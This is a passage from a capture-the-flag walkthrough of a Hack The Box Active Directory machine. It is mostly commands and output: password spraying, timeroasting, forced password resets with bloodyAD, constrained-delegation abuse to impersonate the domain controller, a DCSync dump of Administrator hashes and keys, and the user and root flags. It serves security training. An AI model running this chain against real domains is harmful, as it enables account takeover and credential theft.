Marie.Curie   
Helen.Frost   
Michael.Pontiac   
Mallory.Roberts   
James.Dinkleberg   
Ryan.Cooper   
sql_svc
```

Try `ldap` with `Kerberos`.   Actually this time I got a hit:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ nxc ldap dc.redelegate.vl -u domainusers.txt -p passes2.txt -k
[...]
LDAP        dc.redelegate.vl 389    DC               [+] redelegate.vl\Marie.Curie:Fall2024!
```

Get a ccache

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ impacket-getTGT redelegate.vl/marie.curie:Fall2024\! -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in marie.curie.ccache
```

## What can marie.curie do

Nothing interesting going on in shares

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/marie.curie.ccache nxc smb dc.redelegate.vl -k --use-kcache --shares
```

Found a couple of hashes using the `NetExec` `timeroast` module

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/marie.curie.ccache nxc smb dc.redelegate.vl -k --use-kcache -M timeroast
SMB         dc.redelegate.vl 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) 
SMB         dc.redelegate.vl 445    DC               [+] REDELEGATE.VL\marie.curie from ccache 
TIMEROAST   dc.redelegate.vl 445    DC               [*] Starting Timeroasting...
TIMEROAST   dc.redelegate.vl 445    DC               1002:$sntp-ms$1660abec3cf351eecbe5f4c46360cf17$1c0111e900000000000a75a34c4f434cecad7a3c9e75345fe1b8428bffbfcd0aecae1553428d7096ecae1553428de2ac
TIMEROAST   dc.redelegate.vl 445    DC               1103:$sntp-ms$54856644229dc6ce6d6f7e1b92264d27$1c0111e900000000000a75a44c4f434cecad7a3ca13fe344e1b8428bffbfcd0aecae15546d47d805ecae15546d482f43
```

Try to crack them.  Nothing.  Of note, mode 31300 is only available in newer builds of `hashcat`.  Had to build from source to get that.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ hashcat --identify timeroast.hashes 
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  31300 | MS SNTP                                                    | Network Protocol
  
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ sudo hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt --force --quiet
[sudo] password for notroot: 
```

Password policy analysis.  

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/marie.curie.ccache nxc smb dc.redelegate.vl -k --use-kcache --pass-pol
SMB         dc.redelegate.vl 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) 
SMB         dc.redelegate.vl 445    DC               [+] REDELEGATE.VL\marie.curie from ccache 
SMB         dc.redelegate.vl 445    DC               [+] Dumping password info for domain: REDELEGATE
SMB         dc.redelegate.vl 445    DC               Minimum password length: 7
SMB         dc.redelegate.vl 445    DC               Password history length: 24
SMB         dc.redelegate.vl 445    DC               Maximum password age: 41 days 23 hours 53 minutes 
SMB         dc.redelegate.vl 445    DC               
SMB         dc.redelegate.vl 445    DC               Password Complexity Flags: 000001
SMB         dc.redelegate.vl 445    DC                  Domain Refuse Password Change: 0
SMB         dc.redelegate.vl 445    DC                  Domain Password Store Cleartext: 0
SMB         dc.redelegate.vl 445    DC                  Domain Password Lockout Admins: 0
SMB         dc.redelegate.vl 445    DC                  Domain Password No Clear Change: 0
SMB         dc.redelegate.vl 445    DC                  Domain Password No Anon Change: 0
SMB         dc.redelegate.vl 445    DC                  Domain Password Complex: 1
SMB         dc.redelegate.vl 445    DC               
SMB         dc.redelegate.vl 445    DC               Minimum password age: 1 day 4 minutes 
SMB         dc.redelegate.vl 445    DC               Reset Account Lockout Counter: 10 minutes 
SMB         dc.redelegate.vl 445    DC               Locked Account Duration: 10 minutes 
SMB         dc.redelegate.vl 445    DC               Account Lockout Threshold: None
SMB         dc.redelegate.vl 445    DC               Forced Log off Time: Not Set
```

Machine Account Quota is set to zero, so low-privilege users creating a machine account is out of the question.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/marie.curie.ccache nxc ldap dc.redelegate.vl -k --use-kcache -M maq
LDAP        dc.redelegate.vl 389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
LDAP        dc.redelegate.vl 389    DC               [+] redelegate.vl\Marie.Curie from ccache 
MAQ         dc.redelegate.vl 389    DC               [*] Getting the MachineAccountQuota
MAQ         dc.redelegate.vl 389    DC               MachineAccountQuota: 0
```


### Bloodhound collection

Time to dig deeper, perform a `bloodound-ce-python` collection using the `bloodhound-ce` branch of https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce.  That way I can analyze in `Bloodhound Community Edition`

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/marie.curie.ccache bloodhound-ce-python -k -no-pass -u marie.curie -d redelegate.vl -ns $(etchosts redelegate.vl) --dns-tcp --dns-timeout 10 --zip -op bloody -c all
redelegate.vl == 10.129.234.50  ## `getent ahostsv4 $1 | awk '{print $1}' RS=eof >&1`
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: redelegate.vl
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.redelegate.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.redelegate.vl
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: dc.redelegate.vl
WARNING: SID S-1-5-21-3745110700-3336928118-3915974013-1109 lookup failed, return status: STATUS_NONE_MAPPED
INFO: Done in 00M 27S
INFO: Compressing output into 20251030105643_bloodhound.zip
```

Before analyzing the `bloodhound` collection,  this piece seems to be worth investigating, to see what was missed.

```sh
WARNING: SID S-1-5-21-3745110700-3336928118-3915974013-1109 lookup failed, return status: STATUS_NONE_MAPPED
```

For that, I'll use `powerview.py`, which, IMO, is an awesome remote `powerview` platform that has grown on me.

### Powerview.py analysis

https://github.com/aniqfakhrul/powerview.py

I tried a couple of different queries, nothing was returned:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/marie.curie.ccache powerview -k --no-pass --web --web-host 127.0.0.1 --web-port 8084 --web-auth shrek:mySwampD0nkee\!th1si5 --no-cache --keepalive-interval 30 --obfuscate redelegate.vl/marie.curie@dc.redelegate.vl 

Logging directory is set to /home/notroot/.powerview/logs/redelegate-marie.curie-dc.redelegate.vl
[2025-10-30 11:29:16] User marie.curie has adminCount attribute set to 1. Might be admin somewhere somehow :)
[2025-10-30 11:29:16] Powerview web listening on 127.0.0.1:8084

╭─LDAP─[dc.redelegate.vl]─[REDELEGATE\Marie.Curie]-[NS:<auto>] [WEB]
╰─PV ❯ history
[2] ConvertFrom-SID -ObjectSID 'S-1-5-21-3745110700-3336928118-3915974013-1109'
[1] Get-DomainObject -LDAPFilter '(&(objectclass=*)(objectsid=S-1-5-21-3745110700-3336928118-3915974013-1109))'
```

If I analyze through the web interface, I noticed that RID 1109 does exist:
![[Pasted_image_20251030113607.png]]

However upon closer inspection, the SID doesn't match up:
```
S-1-5-21-4024337825-2033394866-2055507597-1109  (James.Dinkleberg)
S-1-5-21-3745110700-3336928118-3915974013-1109  (??? not even same domain)
```

Probably that is a SID from the machine-local domain (workgroup).

However, I found my controlled user is a member of the `HelpDesk` group:

![[Pasted_image_20251030114432.png]]

That gives me two separate SIDs to be on the lookout for, in DACLs:

```sh
╭─LDAP─[dc.redelegate.vl]─[REDELEGATE\Marie.Curie]-[NS:<auto>] [WEB]
╰─PV ❯ Get-DomainUser -Identity marie.curie -Properties cn,ObjectSid
cn                         : Marie.Curie
objectSid                  : S-1-5-21-4024337825-2033394866-2055507597-1105

╭─LDAP─[dc.redelegate.vl]─[REDELEGATE\Marie.Curie]-[NS:<auto>] [WEB]
╰─PV ❯ Get-DomainGroup -Identity HelpDesk -Properties cn,ObjectSid
cn            : Helpdesk
objectSid     : S-1-5-21-4024337825-2033394866-2055507597-1112
```

One thing I did find that looks interesting is, when checking `Get-DomainObjectAcl`, I kept seeing the SID of the `HelpDesk` group pop up in the logging:

```sh
╭─LDAP─[dc.redelegate.vl]─[REDELEGATE\Marie.Curie]-[NS:<auto>] [WEB]
╰─PV ❯ Get-DomainObjectAcl -ResolveGUIDs -SearchBase "cn=Users,dc=redelegate,dc=vl"

[2025-10-30 12:22:48] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while
[2025-10-30 12:22:48] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##<--- here
[2025-10-30 12:22:48] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##<--- here
[2025-10-30 12:22:48] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519
[2025-10-30 12:22:50] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##<--- here
[2025-10-30 12:22:50] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-517
[2025-10-30 12:22:51] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519
[2025-10-30 12:22:51] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##<--- here
[2025-10-30 12:22:52] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##<--- here
[2025-10-30 12:22:53] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-517
[2025-10-30 12:22:55] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519
[2025-10-30 12:22:55] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-517
[2025-10-30 12:22:57] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##<--- here
[2025-10-30 12:22:58] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519
[2025-10-30 12:22:58] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519
[2025-10-30 12:22:59] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-1112  ##<--- here
[2025-10-30 12:22:59] [ConvertFrom-SID] Multiple objects found for S-1-5-21-4024337825-2033394866-2055507597-519

```

That's when I saw `User-Force-Change-Password` a couple times associated to an SecurityIdentifier of the `HelpDesk` group.

This led me to perform a more comprehensive and targeted search, where I found the `HelpDesk` group has `User-Force-Change-Password` over a number of objects

```sh
╭─LDAP─[dc.redelegate.vl]─[REDELEGATE\Marie.Curie]-[NS:<auto>] [WEB]
╰─PV ❯ Get-DomainObjectAcl -ResolveGUIDs -SearchBase "cn=Users,dc=redelegate,dc=vl" -Where "SecurityIdentifier contains S-1-5-21-4024337825-2033394866-2055507597-1112" -Where "ObjectAceType contains Force-Change-Password" -Select ObjectDn

CN=SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG,CN=Users,DC=redelegate,DC=vl
CN=Guest,CN=Users,DC=redelegate,DC=vl
CN=DnsAdmins,CN=Users,DC=redelegate,DC=vl
CN=Finance,CN=Users,DC=redelegate,DC=vl
CN=IT,CN=Users,DC=redelegate,DC=vl
CN=Helpdesk,CN=Users,DC=redelegate,DC=vl
CN=Michael.Pontiac,CN=Users,DC=redelegate,DC=vl
CN=Helen.Frost,CN=Users,DC=redelegate,DC=vl
CN=Christine.Flanders,CN=Users,DC=redelegate,DC=vl
CN=Protected Users,CN=Users,DC=redelegate,DC=vl
CN=Cloneable Domain Controllers,CN=Users,DC=redelegate,DC=vl
CN=Enterprise Read-only Domain Controllers,CN=Users,DC=redelegate,DC=vl
CN=Denied RODC Password Replication Group,CN=Users,DC=redelegate,DC=vl
CN=Allowed RODC Password Replication Group,CN=Users,DC=redelegate,DC=vl
CN=RAS and IAS Servers,CN=Users,DC=redelegate,DC=vl
CN=Group Policy Creator Owners,CN=Users,DC=redelegate,DC=vl
CN=Domain Users,CN=Users,DC=redelegate,DC=vl
CN=Cert Publishers,CN=Users,DC=redelegate,DC=vl
CN=Users,DC=redelegate,DC=vl
```

At any rate, Bloodhound collection is worth investigating.

### Bloodhound analysis

In fact, `marie.curie` has just that `ForceChangePassword` Outbound Object Control over a number of user accounts:

![[Pasted_image_20251030123838.png]]

Another point of interest, but `Helen.Frost` is a member of `Remote Management Users` (which means WinRM), and also a member of `IT`, which has `GenericAll` over `FS01$`.  The following cipher query embodies both of those connections.

```
match p1=((u:User {name:"HELEN.FROST@REDELEGATE.VL"})-[r:MemberOf]->(g:Group)) 
match p2=((g2:Group {name:"IT@REDELEGATE.VL"})-[r2:GenericAll]->(c:Computer))
WHERE (g.name = "REMOTE MANAGEMENT USERS@REDELEGATE.VL" or g.name = "IT@REDELEGATE.VL")
return p1, p2
```

![[Pasted_image_20251030131518.png]]

## Take control of helen.frost

Change `helen.frost`'s password using `bloodyAD`

https://github.com/CravateRouge/bloodyAD

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ bloodyAD -d redelegate.vl -u marie.curie -k ccache=$(pwd)/marie.curie.ccache -H dc.redelegate.vl -t 10 set password helen.frost 'likelyHOT98!'
[+] Password changed successfully!
```

Get a ccache

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ impacket-getTGT -k redelegate.vl/helen.frost:'likelyHOT98!' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in helen.frost.ccache
```

Using the credential cache of `helen.frost`, do a `WinRM` into the DC.

```powershell
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/helen.frost.ccache evil-winrm -r redelegate.vl -i dc.redelegate.vl

[...]
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> ls ..\desktop\


    Directory: C:\Users\Helen.Frost\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/29/2025  10:47 PM             34 user.txt
```

User flag:
```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> type ..\desktop\user.txt
50fc3b5e9067a2070047abcf5a8dec45
```

So something interesting that I found almost immediately is that `helen.frost` has the `SeEnableDelegationPrivilege` , and its enabled:

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

Might have to circle back on this, first I want to take control of `FS01`.

## GenericAll over FS01$

Take ownership of `FS01$`, `bloodyAD` can do this
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ bloodyAD -d redelegate.vl -u helen.frost -k ccache=$(pwd)/helen.frost.ccache -H dc.redelegate.vl -t 10 set owner 'FS01$' helen.frost
[+] Old owner S-1-5-21-4024337825-2033394866-2055507597-512 is now replaced by helen.frost on FS01$
```

Now I should be able to `ForceChangePassword` over `FS01$`.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ bloodyAD -d redelegate.vl -u helen.frost -k ccache=$(pwd)/helen.frost.ccache -H dc.redelegate.vl -t 10 set password 'FS01$' 'FunnyStuff01!'
[+] Password changed successfully!
```

Obtain a ccache

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ impacket-getTGT -k redelegate.vl/fs01\$:FunnyStuff01\!
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fs01$.ccache
```

My controlled user `helen.frost` has that `SeEnableDelegationPrivilege`.  I also now own `fs01$`.  I can update the machines' `msDS-AllowedToDelegateTo` property, allowing it to delegate to the `CIFS/dc.redelegate.vl` SPN.  Then I can perform a classic Constrained Delegation through `FS01$`.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ bloodyAD -d redelegate.vl -u helen.frost -k ccache=$(pwd)/helen.frost.ccache -H dc.redelegate.vl -t 10 set object 'fs01$' msDS-AllowedToDelegateTo -v "CIFS/dc.redelegate.vl"
[+] fs01$'s msDS-AllowedToDelegateTo has been updated
```

The account must also have `TrustedToAuthForDelegation` flag in its `userAccountControl`.  So I'll add that as well:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ bloodyAD -d redelegate.vl -u helen.frost -k ccache=$(pwd)/helen.frost.ccache -H dc.redelegate.vl -t 10 add uac 'fs01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to fs01$'s userAccountControl
```

What I find is that performing Constrained Delegation, requesting a service ticket fails:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/fs01\$.ccache impacket-getST -k -no-pass -spn "ldap/dc.redelegate.vl" redelegate.vl/fs01\$ -impersonate Administrator -altservice "cifs"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user fs01$ or initial TGT not forwardable
```

That is because the `Administrator` user account is marked with the `NOT_DELEGATED` flag in its `userAccountControl`, so its TGTs are not forwardable.   Therefore, the user account can't be used in any delegation scenario.

![[Pasted_image_20251030162008.png]]

the `michael.pontiac` user doesn't have that problem.

![[Pasted_image_20251030162902.png]]

Same goes for the DC

![[Pasted_image_20251030165116.png]]

Perform constrained delegation, impersonating the DC

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/fs01\$.ccache impacket-getST -k -no-pass redelegate.vl/fs01\$ -spn "cifs/dc.redelegate.vl" -impersonate dc\$
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc$@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Perform a light DCSync against the DC, retrieve the hashes of `Administrator`

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/dc\$\@cifs_dc.redelegate.vl\@REDELEGATE.VL.ccache impacket-secretsdump -k -no-pass redelegate.vl/dc\$\@dc.redelegate.vl -just-dc-user Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
[*] Cleaning up... 
```

Obtain a ccache

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ impacket-getTGT -k -no-pass -aesKey db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173 redelegate.vl/Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

`evil-winrm` into the DC and obtain the root flag

```powershell
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ impacket-getTGT -k -no-pass -aesKey db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173 redelegate.vl/Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ KRB5CCNAME=$(pwd)/Administrator.ccache evil-winrm -r redelegate.vl -i dc.redelegate.vl
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\desktop\root.txt
ee25f5b2f6aa6fa97f16e75b1db43431
```


![[Pasted_image_20251030164855.png]]



